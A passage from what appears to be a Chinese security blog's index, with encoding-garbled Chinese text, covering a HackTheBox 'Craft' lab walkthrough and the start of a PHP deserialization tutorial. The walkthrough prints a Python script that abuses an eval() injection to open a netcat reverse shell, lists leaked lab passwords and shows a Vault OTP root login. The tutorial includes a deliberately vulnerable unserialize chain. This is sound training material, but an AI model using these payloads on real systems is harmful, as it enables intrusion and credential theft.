1sch34p,sh0w m3 the sh31l è¿™é“é¢˜æ²¡æœ‰å¤ç°ç¯å¢ƒï¼Œæ˜¯K0rz3nå¸ˆå‚…æ ¹æ®ä¸Šé¢è¿™é“é¢˜é­”æ”¹çš„ã€‚ å‡ºé¢˜äººçš„æ€è·¯ï¼š https://www.k0rz3n.com/2018/11/19/LCTF 2018 T4lk 1s ch34p,sh0w m3 the sh31l è¯¦ç»†åˆ†æ/","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"PHPååºåˆ—åŒ–","slug":"PHPååºåˆ—åŒ–","permalink":"http://ca0y1h.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"HTB::Craft-walkthrough","date":"2020-05-08T14:29:29.000Z","path":"Target_drone/HackTheBox/16.HTB-Craft-walkthrough/","text":"HTB::Craft Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap REST API Git commit history Vault OTP 0x03 Pentesting Inital Enumeration ç«¯å£æ‰«æ 1234567891011121314151617181920212223242526272829303132333435$ nmap -A -Pn -T4 -p- 10.10.10.110Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-05-01 21:42 EDTNmap scan report for 10.10.10.110Host is up (0.29s latency).Not shown: 65462 closed ports, 70 filtered portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)| ssh-hostkey:| 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)| 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)|_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)443&#x2F;tcp open ssl&#x2F;http nginx 1.15.8|_http-server-header: nginx&#x2F;1.15.8|_http-title: About| ssl-cert: Subject: commonName&#x3D;craft.htb&#x2F;organizationName&#x3D;Craft&#x2F;stateOrProvinceName&#x3D;NY&#x2F;countryName&#x3D;US| Not valid before: 2019-02-06T02:25:47|_Not valid after: 2020-06-20T02:25:47|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http&#x2F;1.1| tls-nextprotoneg:|_ http&#x2F;1.16022&#x2F;tcp open ssh (protocol 2.0)| fingerprint-strings: | NULL: |_ SSH-2.0-Go| ssh-hostkey: |_ 2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :SF-Port6022-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;5&#x2F;1%Time&#x3D;5EACD7D6%P&#x3D;x86_64-pc-linux-gnu%r(NULSF:L,C,&quot;SSH-2\\.0-Go\\r\\n&quot;);Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 2030.05 seconds ä¸»è¦è€ƒå¯Ÿ443ç«¯å£ç«™ç‚¹ å¯¼èˆªæ æœ‰ä¸¤ä¸ªç½‘é¡µé“¾æ¥ï¼š 1234&lt;ul class=&quot;nav navbar-nav pull-right&quot;&gt; &lt;li&gt;&lt;a href=&quot;https://api.craft.htb/api/&quot;&gt;API&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;https://gogs.craft.htb/&quot;&gt;&lt;img border=&quot;0&quot; alt=&quot;Git&quot; src=&quot;/static/img/Git-Icon-Black.png&quot; width=&quot;20&quot; height=&quot;20&quot;&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; æŠŠapi.craft.htbå’Œgogs.craft.htbåŠ åˆ°/etc/hostsæ–‡ä»¶ä¸­ï¼Œå†è®¿é—®ï¼š å‘ç°æ˜¯ä¸€ä¸ªREST APIæ¥å£Swaggeræ–‡æ¡£ï¼Œå•ç‹¬çš„ä¸€ä¸ªAPIæ–‡æ¡£æ²¡æœ‰ä»€ä¹ˆåˆ©ç”¨ä»·å€¼ï¼Œå†å»çœ‹çœ‹gogs.craft.htbï¼š å‘ç°æ˜¯ä¸€ä¸ªç±»ä¼¼GitHubçš„ä»£ç æ‰˜ç®¡å¹³å°ï¼Œé‡Œé¢æœ‰443ç«¯å£ç«™ç‚¹çš„æºä»£ç ï¼Œæ¥çœ‹çœ‹commitæäº¤å†å²ï¼š ä¸»è¦çœ‹ç¼–å·ä¸º c414b16057 and 10e3ba4f0aè¿™ä¸¤ä¸ªcommitsï¼Œå…¶ä¸­c414b16057 ä»£ç æ‰§è¡Œæ¼æ´ï¼š 12345678910111213141516@@ -38,9 +38,13 @@ class BrewCollection(Resource): &quot;&quot;&quot; Creates a new brew entry. &quot;&quot;&quot;-- create_brew(request.json)- return None, 201++ # make sure the ABV value is sane.+ if eval(&#x27;%s &gt; 1&#x27; % request.json[&#x27;abv&#x27;]):+ return &quot;ABV must be a decimal value less than 1.0&quot;, 400+ else:+ create_brew(request.json)+ return None, 201 @ns.route(&#x27;/&lt;int:id&gt;&#x27;) @api.response(404, &#x27;Brew not found.&#x27;) 10e3ba4f0aæœ‰ä¸€å¤„ä»£ç æ³„éœ²ï¼š 123+response = requests.get(&#x27;https://api.craft.htb/api/auth/login&#x27;, auth=(&#x27;dinesh&#x27;, &#x27;4aUh0A8PbVJxgd&#x27;), verify=False)+json_response = json.loads(response.text)+token = json_response[&#x27;token&#x27;] åˆ©ç”¨æ€è·¯ï¼šç”¨å‡­è¯dinesh: 4aUh0A8PbVJxgdç™»å½•api.craft.htb/api/auth/loginï¼Œç„¶åå†åˆ©ç”¨ä»£ç æ‰§è¡Œæ¼æ´å†™å…¥åå¼¹shellï¼Œshow codeï¼š 12345678910111213141516171819202122232425import requestsimport jsonresponse = requests.get(&#x27;https://api.craft.htb/api/auth/login&#x27;, auth=(&#x27;dinesh&#x27;, &#x27;4aUh0A8PbVJxgd&#x27;), verify=False)json_response = json.loads(response.text)token = json_response[&#x27;token&#x27;]headers = &#123; &#x27;X-Craft-API-Token&#x27;: token, &#x27;Content-Type&#x27;: &#x27;application/json&#x27; &#125;# make sure token is validresponse = requests.get(&#x27;https://api.craft.htb/api/auth/check&#x27;, headers=headers, verify=False)print(response.text)print(&quot;Create bogus ABV brew&quot;)payload = &quot;__import__(&#x27;os&#x27;).system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.43 1234 &gt;/tmp/f&#x27;)&quot;brew_dict = &#123;&#125;brew_dict[&#x27;abv&#x27;] = payload + &#x27;| 0.15&#x27;brew_dict[&#x27;name&#x27;] = &#x27;exp&#x27;brew_dict[&#x27;brewer&#x27;] = &#x27;exp&#x27;brew_dict[&#x27;style&#x27;] = &#x27;exp&#x27;json_data = json.dumps(brew_dict)response = requests.post(&#x27;https://api.craft.htb/api/brew/&#x27;, headers=headers, data=json_data, verify=False)print(response.text) ä¸»æœºç›‘å¬1234ç«¯å£ï¼ŒæˆåŠŸåå¼¹shellã€‚ Getting User Access 123456789101112131415161718192021222324&#x2F;opt&#x2F;app # cd &#x2F;&#x2F; # ls -latotal 64drwxr-xr-x 1 root root 4096 Feb 10 2019 .drwxr-xr-x 1 root root 4096 Feb 10 2019 ..-rwxr-xr-x 1 root root 0 Feb 10 2019 .dockerenvdrwxr-xr-x 1 root root 4096 Jan 3 17:20 bindrwxr-xr-x 5 root root 340 Jan 3 14:58 devdrwxr-xr-x 1 root root 4096 Feb 10 2019 etcdrwxr-xr-x 2 root root 4096 Jan 30 2019 homedrwxr-xr-x 1 root root 4096 Feb 6 2019 libdrwxr-xr-x 5 root root 4096 Jan 30 2019 mediadrwxr-xr-x 2 root root 4096 Jan 30 2019 mntdrwxr-xr-x 1 root root 4096 Feb 9 2019 optdr-xr-xr-x 238 root root 0 Jan 3 14:58 procdrwx------ 1 root root 4096 Jan 3 15:16 rootdrwxr-xr-x 2 root root 4096 Jan 30 2019 rundrwxr-xr-x 2 root root 4096 Jan 30 2019 sbindrwxr-xr-x 2 root root 4096 Jan 30 2019 srvdr-xr-xr-x 13 root root 0 Jan 3 14:58 sysdrwxrwxrwt 1 root root 4096 Jan 3 17:26 tmpdrwxr-xr-x 1 root root 4096 Feb 9 2019 usrdrwxr-xr-x 1 root root 4096 Jan 30 2019 var&#x2F; # ç»“æœå‘ç°å¹¶æ²¡æœ‰æ‹¿åˆ°é¶æœºçš„shellï¼Œè€Œæ˜¯ä¸€ä¸ªdockeré•œåƒçš„shellã€‚ å‘ç°åœ¨é¡¹ç›®çš„ä¸»ç›®å½•/opt/appæœ‰ä¸€ä¸ªdbtest.pyæ–‡ä»¶ï¼š 12345678910111213141516171819202122#!&#x2F;usr&#x2F;bin&#x2F;env pythonimport pymysqlfrom craft_api import settings# test connection to mysql databaseconnection &#x3D; pymysql.connect(host&#x3D;settings.MYSQL_DATABASE_HOST, user&#x3D;settings.MYSQL_DATABASE_USER, password&#x3D;settings.MYSQL_DATABASE_PASSWORD, db&#x3D;settings.MYSQL_DATABASE_DB, cursorclass&#x3D;pymysql.cursors.DictCursor)try: with connection.cursor() as cursor: sql &#x3D; &quot;SELECT &#96;id&#96;, &#96;brewer&#96;, &#96;name&#96;, &#96;abv&#96; FROM &#96;brew&#96; LIMIT 1&quot; cursor.execute(sql) result &#x3D; cursor.fetchone() print(result)finally: connection.close() æ­¤æ—¶mysqlå‘½ä»¤åŒæ ·ä¸èƒ½ä½¿ç”¨ã€‚ ä½†æ˜¯ï¼Œæˆ‘ä»¬ä»gogsä»“åº“çš„ä»£ç ä¸­ï¼Œå¾—çŸ¥æ•°æ®åº“ä¸­åº”è¯¥æœ‰ä¸¤å¼ è¡¨ï¼šbrewå’Œuserï¼Œé‚£ä¹ˆå°±å¯ä»¥æ¨¡ä»¿dbtest.pyé‡æ–°å†™ä¸€ä¸ªæŸ¥è¯¢è¯­å¥dumpæ‰€æœ‰çš„ç”¨æˆ·ï¼š 12345678910111213141516171819202122#!/usr/bin/env pythonimport pymysqlfrom craft_api import settings# test connection to mysql databaseconnection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST, user=settings.MYSQL_DATABASE_USER, password=settings.MYSQL_DATABASE_PASSWORD, db=settings.MYSQL_DATABASE_DB, cursorclass=pymysql.cursors.DictCursor)try: with connection.cursor() as cursor: sql = &quot;SELECT `username`, `password` FROM `user`&quot; cursor.execute(sql) result = cursor.fetchall() print(result)finally: connection.close() æ‰€æœ‰ç”¨æˆ·ï¼š 123&#123;&#x27;username&#x27;: &#x27;dinesh&#x27;, &#x27;password&#x27;: &#x27;4aUh0A8PbVJxgd&#x27;&#125;, &#123;&#x27;username&#x27;: &#x27;ebachman&#x27;, &#x27;password&#x27;: &#x27;llJ77D8QFkLPQB&#x27;&#125;, &#123;&#x27;username&#x27;: &#x27;gilfoyle&#x27;, &#x27;password&#x27;: &#x27;ZEU3N8WNM2rh4T&#x27;&#125; ç»è¿‡å°è¯•ï¼Œè¿™å‡ ä¸ªå¯†ç å¹¶ä¸æ˜¯SSHçš„ç™»å½•å¯†ç ï¼Œå®åœ¨æ²¡æ€è·¯äº†å»çœ‹äº†ä¸€çœ¼Writeupï¼Œgilfoyleæœ‰ä¸€ä¸ªç§æœ‰ä»“åº“craft-infraï¼Œå¹¶ä¸”ä»“åº“ä»£ç ä¸­æ³„éœ²äº†SSHçš„private keyï¼š å¹¶ä¸”è¿™ä¸ªprivate keyæœ‰å¯†ç ä¿æŠ¤ï¼Œä½†æ˜¯è¿™ä¸ªå¯†ç å’Œgilfoyleçš„gogså¯†ç ç›¸åŒï¼š Getting Root Access ç”¨æˆ·çš„ä¸»ç›®å½•ä¸‹æœ‰ä¸€ä¸ª.vault_keyæ–‡ä»¶ï¼ŒGoogleä¸€ä¸‹ Secure, store and tightly control access to tokens, passwords, certificates, encryption keys for protecting secrets and other sensitive data using a UI, CLI, or HTTP API. æ ¹æ®https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwordsè¿™ç¯‡æ–‡æ¡£ï¼Œå†ç»“åˆcraft-infraä»“åº“ä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶å¤¹vaultä¸­çš„secrets.shæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨vaultå‘½ä»¤ç™»å½•SSHï¼š 12345gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@127.0.0.1Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayedbelow. Enter this code in the SSH password prompt. If you install sshpass,Vault can automatically perform this step for you.OTP for the session is: a66d769f-f1e3-e3bd-9b52-2cfb7edcd85b è¿™æ ·è¯´èµ·æ¥ææƒè¿‡ç¨‹å¥½åƒæ¯”è¾ƒç®€çŸ­ï¼Œä½†æ˜¯åšèµ·æ¥è¦èŠ±ä¸å°‘çš„åŠŸå¤«ã€‚","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"HTB","permalink":"http://ca0y1h.top/tags/HTB/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"}]},{"title":"PHPååºåˆ—åŒ–æ¼æ´å­¦ä¹ -åŸºç¡€ç¯‡","date":"2020-05-07T06:54:17.000Z","path":"Web_security/php_related/2.PHPååºåˆ—åŒ–å­¦ä¹ -åŸºç¡€ç¯‡/","text":"PHPååºåˆ—åŒ–æ¼æ´å­¦ä¹ â€”â€”åŸºç¡€ç¯‡ 0x01 ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ– phpçš„åºåˆ—åŒ– PHP çš„æ‰€è°“çš„åºåˆ—åŒ–ä¹Ÿæ˜¯ä¸€ä¸ªå°†å„ç§ç±»å‹çš„æ•°æ®ï¼Œå‹ç¼©å¹¶æŒ‰ç…§ä¸€å®šæ ¼å¼å­˜å‚¨çš„è¿‡ç¨‹ï¼Œä»–æ‰€ä½¿ç”¨çš„å‡½æ•°æ˜¯serialize() ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„å®ä¾‹ï¼š 12345678910111213141516171819202122&lt;?phpclass Person&#123; private $name = &#x27;test&#x27;; protected $gender = &#x27;male&#x27;; public $age = 18; public function set_name($name) &#123; $this-&gt;name = $name; &#125; public function get_name() &#123; return $this-&gt;name; &#125;&#125;$user = new Person();$user-&gt;set_name(&#x27;ca01h&#x27;);$data = serialize($user);echo $data; è¿™æ˜¯ä¸€ä¸ªç®€å•çš„ php ç±»ï¼Œç„¶åæˆ‘ä»¬å®ä¾‹åŒ–ä»¥åå¯¹å…¶å±æ€§è¿›è¡Œäº†èµ‹å€¼ï¼Œç„¶åè°ƒç”¨äº† serialize() å¹¶ä¸”è¾“å‡ºï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹è¾“å‡ºçš„ç»“æœï¼š ä¾æ¬¡è§£é‡Šå¦‚ä¸‹ï¼š Oä»£è¡¨Objectå¯¹è±¡ï¼› 6ä»£è¡¨ç±»åé•¿åº¦æ˜¯6ï¼› Personä»£è¡¨ç±»åï¼› 3ä»£è¡¨ç±»ä¸­çš„å±æ€§æœ‰3ä¸ªï¼› s:12:&quot;&lt;0x00&gt;Person&lt;0x00&gt;name&quot;;s:5:&quot;ca01h&quot;;ï¼šå…¶ä¸­sä»£è¡¨Stringç±»å‹ï¼Œ12ä»£è¡¨å±æ€§å&lt;0x00&gt;Person&lt;0x00&gt;nameçš„é•¿åº¦ï¼Œsä»£è¡¨Stringç±»å‹ï¼Œ5ä»£è¡¨å±æ€§å€¼çš„é•¿åº¦ï¼Œ&quot;ca01h&quot;æ˜¯å±æ€§å€¼ï¼› s:9:&quot;&lt;0x00&gt;*&lt;0x00&gt;gender&quot;;s:4:&quot;male&quot;;ï¼šå…¶ä¸­sä»£è¡¨Stringç±»å‹ï¼Œ9ä»£è¡¨å±æ€§å&lt;0x00&gt;*&lt;0x00&gt;genderçš„é•¿åº¦ï¼Œsä»£è¡¨Stringç±»å‹ï¼Œ4ä»£è¡¨å±æ€§å€¼çš„é•¿åº¦ï¼Œ&quot;male&quot;æ˜¯å±æ€§å€¼ï¼› s:3:&quot;age&quot;;i:17;ï¼šå…¶ä¸­sä»£è¡¨Stringç±»å‹ï¼Œ3ä»£è¡¨å±æ€§å&quot;age&quot;çš„é•¿åº¦ï¼Œiä»£è¡¨Integerç±»å‹ï¼Œ17æ˜¯å±æ€§å€¼ã€‚ è¿™é‡Œæœ‰ä¸¤ä¸ªå€¼å¾—æ³¨æ„çš„åœ°æ–¹ï¼š ä¸åŒç±»å‹ç±»å±æ€§ privateå±æ€§åºåˆ—åŒ–çš„æ ¼å¼ï¼š%00ç±»å%00å±æ€§å protectå±æ€§åºåˆ—åŒ–çš„æ ¼å¼ï¼š%00*%00å±æ€§å åºåˆ—åŒ–åªåºåˆ—åŒ–ç±»å±æ€§ï¼Œä¸åºåˆ—åŒ–ç±»æ–¹æ³• æ‰€ä»¥åœ¨åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´çš„æ—¶å€™ï¼š æˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¸€å®šè¦ä¿è¯åœ¨å½“å‰çš„ä½œç”¨åŸŸç¯å¢ƒä¸‹æœ‰è¯¥ç±»å­˜åœ¨ æˆ‘ä»¬åœ¨ååºåˆ—åŒ–æ”»å‡»çš„æ—¶å€™ä¹Ÿå°±æ˜¯ä¾æ‰˜ç±»å±æ€§è¿›è¡Œæ”»å‡» PHPçš„ååºåˆ—åŒ– æœ‰åºåˆ—åŒ–å¯¹è±¡ä¸ºå‹ç¼©æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²ï¼Œå°±æœ‰ååºåˆ—åŒ–å°†å‹ç¼©æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸï¼Œæˆ‘ä»¬è¿˜æ˜¯æ²¿ç”¨ä¸Šé¢çš„ä»£ç ï¼Œå…ˆå°†åºåˆ—åŒ–çš„å†…å®¹å­˜æ”¾åœ¨serialize.txt é‡Œé¢ï¼Œç„¶åå†è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶è¾“å‡ºå±æ€§å€¼nameå’Œageçš„å€¼ï¼š 12345678910111213141516171819202122232425&lt;?phpclass Person&#123; private $name = &#x27;test&#x27;; protected $gender = &#x27;male&#x27;; public $age = 18; public function set_name($name) &#123; $this-&gt;name = $name; &#125; public function get_name() &#123; return $this-&gt;name; &#125;&#125;$user = new Person();$user-&gt;set_name(&#x27;ca01h&#x27;);$data = serialize($user);// echo $data;$data = unserialize($data);echo $data-&gt;age;echo $data-&gt;get_name(); ååºåˆ—åŒ–ç»“æœï¼š 1218ca01h é‚£ä¹ˆç¨å¾®å»¶ç”³ä¸€ç‚¹ï¼Œå¦‚æœ$dataå‚æ•°æ˜¯ç”¨æˆ·å¯æ§çš„å‘¢ï¼Œæ¯”å¦‚æˆ‘ä¼ å…¥ä¸€ä¸ªå¦‚ä¸‹å‚æ•°ï¼š 1O:6:&quot;Person&quot;:3:&#123;s:12:&quot;&lt;0x00&gt;Person&lt;0x00&gt;name&quot;;s:5:&quot;hacker&quot;;s:9:&quot;&lt;0x00&gt;*&lt;0x00&gt;gender&quot;;s:4:&quot;female&quot;;s:3:&quot;age&quot;;i:17;&#125; è¿™æ ·å°±äººä¸ºçš„æ”¹å˜äº†ç±»å±æ€§çš„å€¼ï¼Œç”±æ­¤å¼•å‡ºPHPååºåˆ—åŒ–æ¼æ´ã€‚ 0x02 PHPååºåˆ—åŒ–æ¼æ´ ååºåˆ—åŒ–æ¼æ´çš„æˆå› åœ¨äºä»£ç ä¸­çš„ unserialize() æ¥æ”¶çš„å‚æ•°å¯æ§ï¼Œä»ä¸Šé¢çš„ä¾‹å­çœ‹ï¼Œè¿™ä¸ªå‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ï¼Œè€Œåºåˆ—åŒ–çš„å¯¹è±¡åªå«æœ‰å¯¹è±¡çš„å±æ€§ï¼Œé‚£æˆ‘ä»¬å°±è¦åˆ©ç”¨å¯¹å¯¹è±¡å±æ€§çš„ç¯¡æ”¹å®ç°æœ€ç»ˆçš„æ”»å‡»ã€‚ é­”æ³•æ–¹æ³•è°ƒç”¨ 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpClass User&#123; public $name = &quot;Bob&quot;; private $id = &quot;417&quot;; function __construct($name)&#123; $this-&gt;name = $name; echo &quot;this is __construct&quot;.&quot;&lt;/br&gt;&quot;; &#125; function __destruct()&#123; echo &quot;this is __destruct&quot;.&quot;&lt;/br&gt;&quot;; &#125; function __invoke()&#123; echo &quot;this is __invoke&quot;.&quot;&lt;/br&gt;&quot;; &#125; function __toString()&#123; return &quot;this is __toString&quot;.&quot;&lt;/br&gt;&quot;; &#125; function __wakeup()&#123; echo &quot;this is __wakeup&quot;.&quot;&lt;/br&gt;&quot;; &#125; function __sleep()&#123; echo &quot;this is __sleep&quot;.&quot;&lt;/br&gt;&quot;; return array(&quot;name&quot;,&quot;id&quot;); &#125; function __call($name,$args)&#123; echo &quot;this is __call. name is &quot;.$name.&quot; args is &quot;.$args.&quot;&lt;/br&gt;&quot;; &#125; function __get($arg)&#123; echo&quot;call __get&quot;.&quot;&lt;/br&gt;&quot;; &#125; function __set($name,$id)&#123; echo &quot;call __set&quot;.&quot;&lt;/br&gt;&quot;; &#125;&#125;$r = new User(&quot;Alice&quot;);$r();echo $r;unserialize(serialize($r));$r-&gt;print(&quot;a&quot;);$r-&gt;id;$r-&gt;id = 1; è¾“å‡ºé¡ºåºå¦‚ä¸‹ï¼š 12345678910this is __constructthis is __invokethis is __toStringthis is __sleepthis is __wakeupthis is __destructthis is __call. name is print args is Arraycall __getcall __setthis is __destruct å…¶ä¸­__toString()è§¦å‘æ–¹å¼æ¯”è¾ƒå¤šï¼š echo ($obj) / print($obj) æ‰“å°æ—¶ä¼šè§¦å‘ ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶ ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶ ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒæ—¶ï¼ˆPHPè¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰ ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–SQLè¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶ ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚ strlen()ã€addslashes()æ—¶ åœ¨in_array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰toStringè¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™toStringä¼šè¢«è°ƒç”¨ ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸º class_exists() çš„å‚æ•°çš„æ—¶å€™ é­”æ³•æ–¹æ³•çš„ä½œç”¨ æˆ‘ä»¬ä¸Šé¢è®²è¿‡ï¼Œåœ¨æˆ‘ä»¬çš„æ”»å‡»ä¸­ï¼Œååºåˆ—åŒ–å‡½æ•° unserialize() æ˜¯æˆ‘ä»¬æ”»å‡»çš„å…¥å£ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦è¿™ä¸ªå‚æ•°å¯æ§ï¼Œæˆ‘ä»¬å°±èƒ½ä¼ å…¥ä»»ä½•çš„å·²ç»åºåˆ—åŒ–çš„å¯¹è±¡ï¼ˆåªè¦è¿™ä¸ªç±»åœ¨å½“å‰ä½œç”¨åŸŸå­˜åœ¨æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ï¼‰ï¼Œè€Œä¸æ˜¯å±€é™äºå‡ºç° unserialize() å‡½æ•°çš„ç±»çš„å¯¹è±¡ï¼Œå¦‚æœåªèƒ½å±€é™äºå½“å‰ç±»ï¼Œé‚£æˆ‘ä»¬çš„æ”»å‡»é¢ä¹Ÿå¤ªç‹­å°äº†ï¼Œè¿™ä¸ªç±»ä¸è°ƒç”¨å±é™©çš„æ–¹æ³•æˆ‘ä»¬å°±æ²¡æ³•å‘èµ·æ”»å‡»ã€‚ ä½†æ˜¯æˆ‘ä»¬åˆçŸ¥é“ï¼Œä½ ååºåˆ—åŒ–äº†å…¶ä»–çš„ç±»å¯¹è±¡ä»¥åæˆ‘ä»¬åªæ˜¯æ§åˆ¶äº†æ˜¯å±æ€§ï¼Œå¦‚æœä½ æ²¡æœ‰åœ¨å®Œæˆååºåˆ—åŒ–åçš„ä»£ç ä¸­è°ƒç”¨å…¶ä»–ç±»å¯¹è±¡çš„æ–¹æ³•ï¼Œæˆ‘ä»¬è¿˜æ˜¯æŸæ‰‹æ— ç­–ï¼Œæ¯•ç«Ÿä»£ç æ˜¯äººå®¶å†™çš„ï¼Œäººå®¶æœ¬èº«å°±æ˜¯è¦ååºåˆ—åŒ–åè°ƒç”¨è¯¥ç±»çš„æŸä¸ªå®‰å…¨çš„æ–¹æ³•ï¼Œä½ æ€»ä¸èƒ½æ”¹äººå®¶çš„ä»£ç å§ï¼Œä½†æ˜¯æ²¡å…³ç³»ï¼Œå› ä¸ºæˆ‘ä»¬æœ‰é­”æ³•æ–¹æ³•ã€‚ é­”æ³•æ­£å¦‚ä¸Šé¢ä»‹ç»çš„ï¼Œé­”æ³•æ–¹æ³•çš„è°ƒç”¨æ˜¯åœ¨è¯¥ç±»åºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–çš„åŒæ—¶è‡ªåŠ¨å®Œæˆçš„ï¼Œä¸éœ€è¦äººå·¥å¹²é¢„ï¼Œè¿™å°±éå¸¸ç¬¦åˆæˆ‘ä»¬çš„æƒ³æ³•ï¼Œå› æ­¤åªè¦é­”æ³•æ–¹æ³•ä¸­å‡ºç°äº†ä¸€äº›æˆ‘ä»¬èƒ½åˆ©ç”¨çš„å‡½æ•°ï¼Œæˆ‘ä»¬å°±èƒ½é€šè¿‡ååºåˆ—åŒ–ä¸­å¯¹å…¶å¯¹è±¡å±æ€§çš„æ“æ§æ¥å®ç°å¯¹è¿™äº›å‡½æ•°çš„æ“æ§ï¼Œè¿›è€Œè¾¾åˆ°æˆ‘ä»¬å‘åŠ¨æ”»å‡»çš„ç›®çš„ã€‚ é­”æ³•æ–¹æ³•çš„ç®€å•åˆ©ç”¨ 123456789101112131415161718192021222324252627&lt;?phpclass demo &#123; private $test; public $name = &quot;i am ca01h&quot;; function __construct() &#123; $this-&gt;test = new L(); &#125; function __destruct() &#123; $this-&gt;test-&gt;action(); &#125;&#125;class L &#123; function action() &#123; echo &quot;function action() in class L&quot;; &#125;&#125;class Evil &#123; var $test2; function action() &#123; eval($this-&gt;test2); &#125;&#125;unserialize($_GET[&#x27;test&#x27;]); é¦–å…ˆæˆ‘ä»¬èƒ½çœ‹åˆ°unserialize()å‡½æ•°çš„å‚æ•°æˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬èƒ½é€šè¿‡è¿™ä¸ªæ¥å£ååºåˆ—åŒ–ä»»ä½•ç±»çš„å¯¹è±¡(ä½†åªæœ‰åœ¨å½“å‰ä½œç”¨åŸŸçš„ç±»æ‰å¯¹æˆ‘ä»¬æœ‰ç”¨)ï¼Œé‚£æˆ‘ä»¬çœ‹ä¸€ä¸‹å½“å‰è¿™ä¸‰ä¸ªç±»ï¼Œæˆ‘ä»¬çœ‹åˆ°åé¢ä¸¤ä¸ªç±»ååºåˆ—åŒ–ä»¥åå¯¹æˆ‘ä»¬æ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œå› ä¸ºæˆ‘ä»¬æ ¹æœ¬æ²¡æ³•è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªç±»å°±ä¸ä¸€æ ·äº†ï¼Œè™½ç„¶æˆ‘ä»¬ä¹Ÿæ²¡æœ‰ä»€ä¹ˆä»£ç èƒ½å®ç°è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°ä»–æœ‰ä¸€ä¸ªé­”æ³•å‡½æ•° __destruct() ï¼Œè¿™å°±éå¸¸æœ‰è¶£äº†ï¼Œå› 